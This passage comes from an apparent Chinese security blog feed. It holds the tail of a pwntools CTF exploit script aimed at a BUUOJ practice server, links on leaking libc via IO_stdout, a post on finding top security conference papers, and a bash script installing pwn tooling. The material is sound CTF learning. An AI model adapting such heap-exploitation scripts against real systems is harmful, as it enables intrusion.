class=\"string\">&#x27;size:&#x27;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\"><span class=\"comment\">################################### End ##############################################</span></span><br><span class=\"line\">pwn()</span><br><span class=\"line\">p.close()</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">while 1:</span></span><br><span class=\"line\"><span class=\"string\">    try:</span></span><br><span class=\"line\"><span class=\"string\">        pwn()</span></span><br><span class=\"line\"><span class=\"string\">        break</span></span><br><span class=\"line\"><span class=\"string\">    except KeyboardInterrupt:</span></span><br><span class=\"line\"><span class=\"string\">        p.close()</span></span><br><span class=\"line\"><span class=\"string\">        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)</span></span><br><span class=\"line\"><span class=\"string\">        #p = process(binary)</span></span><br><span class=\"line\"><span class=\"string\">    except :</span></span><br><span class=\"line\"><span class=\"string\">        p.close()</span></span><br><span class=\"line\"><span class=\"string\">        #p = process(binary)</span></span><br><span class=\"line\"><span class=\"string\">        p = remote(&quot;node4.buuoj.cn&quot;,&quot;27593&quot;)</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/u014377094/article/details/124577350\">https://blog.csdn.net/u014377094/article/details/124577350</a></p>\n<p><a href=\"https://blog.csdn.net/csdn546229768/article/details/123717993\">https://blog.csdn.net/csdn546229768/article/details/123717993</a></p>\n<p>IO_stdout泄漏libc</p>\n<p>pwndbg: parseheap</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/320151545\">https://zhuanlan.zhihu.com/p/320151545</a> 这个蛮详细的</p>\n<p><a href=\"https://blog.csdn.net/zzq487782568/article/details/123773034\">https://blog.csdn.net/zzq487782568/article/details/123773034</a> 这个整体思路可以 利用unstortedbin打stdout泄露出libc</p>\n<p><a href=\"https://www.cnblogs.com/LynneHuan/p/14851770.html\">https://www.cnblogs.com/LynneHuan/p/14851770.html</a></p>\n<p><a href=\"https://j-kangel.github.io/2020/03/13/%E5%88%A9%E7%94%A8-IO-2-1-stdout-%E6%B3%84%E6%BC%8Flibc/#%E5%88%86%E6%9E%90\">https://j-kangel.github.io/2020/03/13/利用-IO-2-1-stdout-泄漏libc/#分析</a></p>\n<h1 id=\"遗留问题\"><a href=\"#遗留问题\" class=\"headerlink\" title=\"遗留问题\"></a>遗留问题</h1><p>为什么后来分配的 malloc(4,0x10)的fd和nt是那个值呢？</p>\n<p><strong>枚举的话, 不用增加点偏移吗, 或者说偏移也有可能是0?</strong></p>\n<p>pwndbg: parseheap</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/",
            "url": "https://tangzichengcc.github.io/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/",
            "title": "网安四大顶会及科研前沿资源整理",
            "date_published": "2023-10-20T06:59:53.000Z",
            "content_html": "<p>研一读了一点论文,研二开始读的少了,毕竟是专硕………. 不过好歹是学习到了一点东西,觉得有必要整理一下,将来肯定还会用到.</p>\n<p>科研 <a href=\"https://www.aminer.cn/\">https://www.aminer.cn</a> 这种集合网站,可以按照论文等级等搜索,挺好用的</p>\n<p>顶会论文,其他CCF类论文</p>\n<p>论文寻找方式, 下载方式  知网 scihub、  中文期刊</p>\n<p>其他 像 blackhat等会议</p>\n<p>论文知识图谱</p>\n<p>dblp</p>\n<p>国外几大出版社</p>\n<p><a href=\"https://arxiv.org/\">https://arxiv.org</a></p>\n<h1 id=\"一、论文获取\"><a href=\"#一、论文获取\" class=\"headerlink\" title=\"一、论文获取\"></a>一、论文获取</h1><h2 id=\"四大顶会\"><a href=\"#四大顶会\" class=\"headerlink\" title=\"四大顶会\"></a>四大顶会</h2><p>​\t网安有四大顶会, 文章质量非常高,代表了最前沿的网安技术.</p>\n<img src=\"/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/image-20231020150449912.png\" alt=\"image-20231020150449912\" style=\"zoom:33%;\">\n\n<h3 id=\"1-usenix-security\"><a href=\"#1-usenix-security\" class=\"headerlink\" title=\"1. usenix security\"></a>1. usenix security</h3><p>官网:<a href=\"https://www.usenix.org/\">https://www.usenix.org</a></p>\n<p>​\t可以从上方的conferences找到会议信息,或者直接进这个链接,有历年的<a href=\"https://www.usenix.org/conferences/byname/108\">https://www.usenix.org/conferences/byname/108</a></p>\n<img src=\"/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/image-20231020150708818.png\" alt=\"image-20231020150708818\" style=\"zoom:33%;\">\n\n\n\n<p>​\t从主入口进的不一定是usenix顶会会议,还有其他会议,这个才是</p>\n<img src=\"/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/image-20231020150649592.png\" alt=\"image-20231020150649592\" style=\"zoom:33%;\">\n\n\n\n<p>然后可以从program里面找paper</p>\n<img src=\"/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/image-20231020151254634.png\" alt=\"image-20231020151254634\" style=\"zoom:33%;\">\n\n\n\n\n\n<p>快速的论文检索: 可以看目录 program–TECHNICAL SESSIONS–Table of Contents</p>\n<p>可以从里面看小标题分类,找感兴趣的方向</p>\n<p><a href=\"https://www.usenix.org/sites/default/files/sec23_contents.pdf\">https://www.usenix.org/sites/default/files/sec23_contents.pdf</a></p>\n<h3 id=\"2-NDSS\"><a href=\"#2-NDSS\" class=\"headerlink\" title=\"2.NDSS\"></a>2.NDSS</h3><p>官网:<a href=\"https://www.ndss-symposium.org/\">https://www.ndss-symposium.org</a></p>\n<p>NDSS收文量就少很多了,上方导航能很清晰看到会议信息,</p>\n<p>可以查看目录快速浏览(program-symposium program-Proceedings Frontmatter):<a href=\"https://www.ndss-symposium.org/wp-content/uploads/NDSS2022_Proceedings_Front_Matter.pdf\">https://www.ndss-symposium.org/wp-content/uploads/NDSS2022_Proceedings_Front_Matter.pdf</a></p>\n<p><a href=\"https://www.likecs.com/show-433567.html\">https://www.likecs.com/show-433567.html</a></p>\n<p><a href=\"https://www.ndss-symposium.org/ndss2019/accepted-papers/\">https://www.ndss-symposium.org/ndss2019/accepted-papers/</a></p>\n<h3 id=\"3-CCS\"><a href=\"#3-CCS\" class=\"headerlink\" title=\"3.CCS\"></a>3.CCS</h3><p>ACM SIGSAC Conference on Computer and Communications Security</p>\n<p>官网: <a href=\"https://www.sigsac.org/ccs.html\">https://www.sigsac.org/ccs.html</a></p>\n<p>acm数据库中: <a href=\"https://dl.acm.org/conference/ccs/proceedings\">https://dl.acm.org/conference/ccs/proceedings</a>  可以看Front Matter,类似于目录</p>\n<p><a href=\"https://www.sigsac.org/ccs/CCS2018/proceedings/\">https://www.sigsac.org/ccs/CCS2018/proceedings/</a></p>\n<p><a href=\"https://www.sigsac.org/ccs/CCS2022/program/accepted-papers.html\">https://www.sigsac.org/ccs/CCS2022/program/accepted-papers.html</a></p>\n<h3 id=\"4-S-amp-P\"><a href=\"#4-S-amp-P\" class=\"headerlink\" title=\"4. S&amp;P\"></a>4. S&amp;P</h3><p>IEEE Symposium on Security and Privacy</p>\n<p>官网:<a href=\"https://www.ieee-security.org/index.html\">https://www.ieee-security.org/index.html</a></p>\n<p>dblp:<a href=\"https://dblp.uni-trier.de/db/conf/sp/index.html\">https://dblp.uni-trier.de/db/conf/sp/index.html</a></p>\n<p>2023年的: <a href=\"https://www.ieee-security.org/TC/SP2023/\">https://www.ieee-security.org/TC/SP2023/</a></p>\n<p>sp的sok论文(综述论文) <a href=\"https://oaklandsok.github.io/\">https://oaklandsok.github.io</a></p>\n<p>这个好像分了sp和euro sp, euro sp就不是A类会议了?</p>\n<h2 id=\"CCF推荐\"><a href=\"#CCF推荐\" class=\"headerlink\" title=\"CCF推荐\"></a>CCF推荐</h2><img src=\"/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/image-20231020160551139.png\" alt=\"image-20231020160551139\" style=\"zoom:33%;\">\n\n<h2 id=\"中文论文\"><a href=\"#中文论文\" class=\"headerlink\" title=\"中文论文\"></a>中文论文</h2><p>​\t虽然确实好的期刊大部分都是国外的,尤其是top,但不能一棒子否认国内的期刊,国内也是要发展的,也不能都投到国外,中文期刊还是有一些不错的,可以参考. <strong>尤其是前期调研,读大段英语费劲的时候,可以先看看中文的,(不过话说是不是英语很好了就没这个问题了..233)</strong></p>\n<p>信息安全学报 <a href=\"http://jcs.iie.ac.cn/xxaqxb/ch/index.aspx\">http://jcs.iie.ac.cn/xxaqxb/ch/index.aspx</a></p>\n<p>电子学报 <a href=\"https://www.ejournal.org.cn/CN/0372-2112/home.shtml\">https://www.ejournal.org.cn/CN/0372-2112/home.shtml</a></p>\n<p>计算机学报</p>\n<h2 id=\"其他途径获取\"><a href=\"#其他途径获取\" class=\"headerlink\" title=\"其他途径获取\"></a>其他途径获取</h2><p>公众号,如gossip</p>\n<h2 id=\"硕博论文\"><a href=\"#硕博论文\" class=\"headerlink\" title=\"硕博论文\"></a>硕博论文</h2><h1 id=\"二、论文工具与经验\"><a href=\"#二、论文工具与经验\" class=\"headerlink\" title=\"二、论文工具与经验\"></a>二、论文工具与经验</h1><p><a href=\"https://www.researchrabbit.ai/\">https://www.researchrabbit.ai/</a></p>\n<p>工具:Connected Papers <a href=\"https://www.connectedpapers.com/\">https://www.connectedpapers.com/</a></p>\n<p><a href=\"https://letpub.com.cn/\">https://letpub.com.cn/</a> 可以查影响因子什么的</p>\n<p>大佬们:</p>\n<p><a href=\"https://dl.acm.org/profile/81100363323\">https://dl.acm.org/profile/81100363323</a></p>\n<p>苏璞睿:二进制漏洞 <a href=\"https://people.ucas.edu.cn/~purui\">https://people.ucas.edu.cn/~purui</a></p>\n<p>信息计量学</p>\n<p><img src=\"/%E7%BD%91%E5%AE%89%E5%9B%9B%E5%A4%A7%E9%A1%B6%E4%BC%9A%E5%8F%8A%E7%A7%91%E7%A0%94%E5%89%8D%E6%B2%BF%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/image-20231020163023512.png\" alt=\"image-20231020163023512\"></p>\n<h3 id=\"zotero\"><a href=\"#zotero\" class=\"headerlink\" title=\"zotero\"></a>zotero</h3><p>一个非常好用的文献管理工具, 还可以选择翻译!</p>\n<h2 id=\"经验\"><a href=\"#经验\" class=\"headerlink\" title=\"经验\"></a>经验</h2><p>找论文可以以一篇好的综述，往旧的年份找的话，看它引用，往新的年份找的话，可以看谁引用了它</p>\n<p>看引用数量也可以看出来文章的质量,(就不用看期刊的等级了)</p>\n",
            "tags": [
                "论文"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-43-pwn%E5%81%9A%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E8%84%9A%E6%9C%AC/",
            "title": "pwn入门-43-pwn做题环境搭建脚本",
            "date_published": "2023-10-04T12:56:34.000Z",
            "content_html": "<p>​\t\t之前m1不支持x86,一直用云服务器有时候经常换,每次都需要手动搭建环境,一直想写个脚本,但有时候一直懒…终于整理出来了..</p>\n<p><font color=\"red\">(感谢chatgpt)</font></p>\n<p>​\t\t然后这个脚本目前还有很多小问题和可以改进的地方</p>\n<h2 id=\"要安装的内容\"><a href=\"#要安装的内容\" class=\"headerlink\" title=\"要安装的内容\"></a>要安装的内容</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 必要的安装</span></span><br><span class=\"line\">apt-get update</span><br><span class=\"line\">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\">sudo apt install -y git vim gdb strace ltrace  socat netcat</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwntools</span></span><br><span class=\"line\">python3 -m pip install --upgrade pip</span><br><span class=\"line\">python3 -m pip install --upgrade pwntools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwndbg</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class=\"line\"><span class=\"built_in\">cd</span> pwndbg</span><br><span class=\"line\">sudo ./setup.sh</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;source /ctfpwntools/pwndbg/gdbinit.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装glibc-all-in-one</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> glibc-all-in-one/</span><br><span class=\"line\">python3 update_list</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装ROPgadget</span></span><br><span class=\"line\">pip install capstone</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ROPgadget</span><br><span class=\"line\">sudo python3 setup.py install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># one_gadget</span></span><br><span class=\"line\">apt -y install ruby</span><br><span class=\"line\">gem install one_gadget </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># LibcSearcher</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> LibcSearcher</span><br><span class=\"line\">python3 setup.py develop</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># patchelf</span></span><br><span class=\"line\">apt-get install autoconf automake libtool</span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> patchelf</span><br><span class=\"line\">./bootstrap.sh </span><br><span class=\"line\">./configure</span><br><span class=\"line\">make</span><br><span class=\"line\">make check</span><br><span class=\"line\">make install</span><br><span class=\"line\"><span class=\"built_in\">cd</span> ..</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">##  seccomp</span></span><br><span class=\"line\"><span class=\"comment\"># 1.添加仓库</span></span><br><span class=\"line\">  sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class=\"line\">  sudo apt-get update</span><br><span class=\"line\"><span class=\"comment\"># 2.指定安装 ruby 2.6 版本</span></span><br><span class=\"line\">  sudo apt-get install ruby2.6 ruby2.6-dev </span><br><span class=\"line\"><span class=\"comment\"># 3.然后安装 seccomp-tools</span></span><br><span class=\"line\">  sudo gem install seccomp-tools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 32位libc</span></span><br><span class=\"line\">dpkg --add-architecture i386</span><br><span class=\"line\">apt-get install libc6:i386</span><br><span class=\"line\">apt-get install libgtk2.0-0:i386</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"简单的开始\"><a href=\"#简单的开始\" class=\"headerlink\" title=\"简单的开始\"></a>简单的开始</h2><p>​\t\t简单的创建while循环,指定安装次数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#! /bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /ctfpwntools</span><br><span class=\"line\"><span class=\"built_in\">cd</span> /ctfpwntools</span><br><span class=\"line\"></span><br><span class=\"line\">MAX_RETRIES=3</span><br><span class=\"line\">INSTALL_SUCCESS=<span class=\"literal\">false</span></span><br><span class=\"line\">RETRY_COUNT=0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新apt源</span></span><br><span class=\"line\">sudo apt update</span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\">sudo apt install -y git vim gdb strace ltrace nmap socat netcat</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwntools</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> [ <span class=\"variable\">$RETRY_COUNT</span> -lt <span class=\"variable\">$MAX_RETRIES</span> ] &amp;&amp; [ <span class=\"string\">&quot;<span class=\"variable\">$INSTALL_SUCCESS</span>&quot;</span> = <span class=\"literal\">false</span> ]</span><br><span class=\"line\"><span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Attempt <span class=\"subst\">$((RETRY_COUNT+1)</span>) to install pwntools...&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class=\"line\">    python3 -m pip install --upgrade pip</span><br><span class=\"line\">    python3 -m pip install --upgrade pwntools</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检查安装是否成功</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ $? -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        INSTALL_SUCCESS=<span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        RETRY_COUNT=$((RETRY_COUNT+<span class=\"number\">1</span>))</span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">&quot;<span class=\"variable\">$INSTALL_SUCCESS</span>&quot;</span> = <span class=\"literal\">true</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;pwntools installed successfully!&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Failed to install pwntools after <span class=\"variable\">$MAX_RETRIES</span> attempts.&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\">MAX_RETRIES=3</span><br><span class=\"line\">INSTALL_SUCCESS=<span class=\"literal\">false</span></span><br><span class=\"line\">RETRY_COUNT=0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装pwndbg</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>....</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"另外一种方式\"><a href=\"#另外一种方式\" class=\"headerlink\" title=\"另外一种方式\"></a>另外一种方式</h2><p>​\t\t只需要定义一个变量, 而且代码量少了很多</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">MAX_RETRY=3</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新apt源</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> sudo apt update; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新apt源时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新apt源失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> xxxxxxxxxxx; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"定好模版\"><a href=\"#定好模版\" class=\"headerlink\" title=\"定好模版\"></a>定好模版</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">MAX_RETRY=3</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装常用工具</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (( i=1; i&lt;=<span class=\"variable\">$MAX_RETRY</span>; i++ )); <span class=\"keyword\">do</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> xxxxxxxxxxx; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">break</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> [ <span class=\"variable\">$i</span> -eq <span class=\"variable\">$MAX_RETRY</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具时出现错误&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\">  <span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装常用工具失败，正在进行第<span class=\"variable\">$i</span>次重试...&quot;</span></span><br><span class=\"line\">  <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"套上\"><a href=\"#套上\" class=\"headerlink\" title=\"套上!\"></a>套上!</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span 